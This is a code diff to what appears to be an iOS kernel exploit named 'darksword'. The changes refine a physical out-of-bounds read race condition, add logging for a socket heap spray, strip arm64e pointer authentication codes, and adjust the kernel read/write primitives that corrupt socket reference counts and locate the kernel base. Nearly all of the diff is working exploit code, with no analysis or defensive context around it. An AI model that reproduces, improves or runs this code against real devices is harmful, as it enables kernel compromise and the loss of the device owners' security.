@@ -75,6 +75,16 @@ extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
 #pragma clang diagnostic push
 #pragma clang diagnostic ignored "-Wdeprecated-declarations"
 
+#ifdef __arm64e__
+static uint64_t __attribute((naked)) __xpaci(uint64_t a)
+{
+    asm(".long        0xDAC143E0"); // XPACI X0
+    asm("ret");
+}
+#else
+#define __xpaci(x) x
+#endif
+
 #include "offsets.h"
 #include "AppDelegate.h"
 
@@ -295,24 +305,31 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
     iov.iov_len = off + size;
     *(uint64_t*)buf = randomMarker;
     *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
+
+    bool readRaceSucceeded = false;
     for (int t = 0; t < highestSuccessIdx + 100; t++) {
         raceSync = 1;
-        pwritev(readFd, &iov, 1, 0x3f00);
+        int w = pwritev(readFd, &iov, 1, 0x3f00);
         while (raceSync == 1) {}
         mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
             VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-        pread(readFd, buf, size, 0x3f00 + off);
-        if (*(uint64_t*)buf != randomMarker) {
-            if (t > highestSuccessIdx) highestSuccessIdx = t;
-            targetObject = 0;
-            return KERN_SUCCESS;
+        if (w == -1) {
+            pread(readFd, buf, size, 0x3f00 + off);
+            uint64_t marker = *(uint64_t*)buf;
+            if (marker != randomMarker) {
+                readRaceSucceeded = true;
+                successReadCount++;
+                if (t > highestSuccessIdx) highestSuccessIdx = t;
+                break;
+            }
         }
         usleep(1);
         if (t == 500) break;
     }
     targetObject = 0;
-    return 1;
+    if (!readRaceSucceeded) return 1;
+    return KERN_SUCCESS;
 }
 
 kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
@@ -1267,6 +1284,7 @@ static bool method_purple_info_leak(void) {
 }
 
 bool run_darksword(void) {
+    gMlockDict = [NSMutableDictionary new];
     randomMarker = (uint64_t)arc4random() << 32 | arc4random();
     printf("[+] randomMarker: 0x%016llx\n\n", randomMarker);
     uint32_t sz = PATH_MAX;
@@ -1315,14 +1333,20 @@ bool run_darksword(void) {
         for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
             if (spray_socket() == -1) break;
         }
+        printf("[exploit] sprayed %lu sockets (start=0x%llx end=0x%llx)\n",
+            (unsigned long)[socketPorts count],
+            [(NSNumber*)[socketPcbIds firstObject] unsignedLongLongValue],
+            [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);
 
         bool ok = false;
         for (uint64_t s = 0; s < mappingNum; s++) {
             mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
+            printf("[exploit] looking in search mapping: %llu\n", s);
             mach_port_t memObj = 0;
             mach_vm_size_t mos = searchSize;
             mach_make_memory_entry_64(mach_task_self(), &mos, sma,
                 VM_PROT_DEFAULT, &memObj, 0);
+            surface_mlock(sma, searchSize);
 
             for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
@@ -1347,6 +1371,9 @@ bool run_darksword(void) {
         printf("[exploit] attempt %d: no socket found, retrying\n", attempt);
     }
 
+    printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
+    printf("[+] successReadCount: %d\n", successReadCount);
+
     goSync = 0; raceSync = 1;
     pthread_join(freeThread, NULL);
     close(writeFd); close(readFd);
@@ -1357,14 +1384,14 @@ bool run_darksword(void) {
     if (!csa || !rsa) return false;
 
     kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
-        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
+        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
-        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
+        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
 
     uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
     uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
-    uint64_t tp = kread64(pp + OFFSET_PR_INPUT);
+    uint64_t tp = __xpaci(kread64(pp + OFFSET_PR_INPUT));
     gKernelBase = tp & 0xFFFFFFFFFFFFC000;
     while (1) {
         uint64_t magic = kread64(gKernelBase);
